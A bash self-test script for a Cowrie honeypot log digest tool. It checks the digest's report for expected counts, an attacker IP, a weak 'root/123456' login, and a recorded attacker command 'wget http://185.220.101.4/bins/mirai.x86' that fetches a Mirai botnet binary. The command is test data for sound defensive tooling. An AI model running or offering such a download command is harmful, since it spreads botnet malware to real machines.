#!/usr/bin/env bash
# cowrie-digest self-test — runs the digest against a fixture log and
# verifies the aggregation. No network, no Cowrie required.
set -euo pipefail

SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FIXTURE="${SRC_DIR}/tests/fixtures/sample_cowrie.jsonl"
TMP_CFG="$(mktemp)"
trap 'rm -f "${TMP_CFG}"' EXIT

cat > "${TMP_CFG}" <<EOF
COWRIE_LOG=${FIXTURE}
DIGEST_HOURS=876000
STATE_DIR=$(mktemp -d)
SENSOR_NAME=test-sensor
EOF

echo "==> running digest against fixture..."
OUT="$("${SRC_DIR}/digest.py" --print --config "${TMP_CFG}")"
echo "${OUT}"
echo ""

fail=0
check() {
    if grep -qF "$1" <<<"${OUT}"; then
        echo "PASS: report contains '$1'"
    else
        echo "FAIL: report missing '$1'" >&2
        fail=1
    fi
}

check "Connections:      4"
check "Unique IPs:       3"
check "Failed logins:    5"
check "Successful logins: 2"
check "Commands run:     3"
check "Files downloaded: 1"
check "198.51.100.23"
check "root/123456"
check "wget http://185.220.101.4/bins/mirai.x86"
check "http://185.220.101.4/bins/mirai.x86"
check "IPs that got a shell"

echo ""
if [[ ${fail} -eq 0 ]]; then
    echo "==> ALL TESTS PASSED"
else
    echo "==> TESTS FAILED" >&2
    exit 1
fi
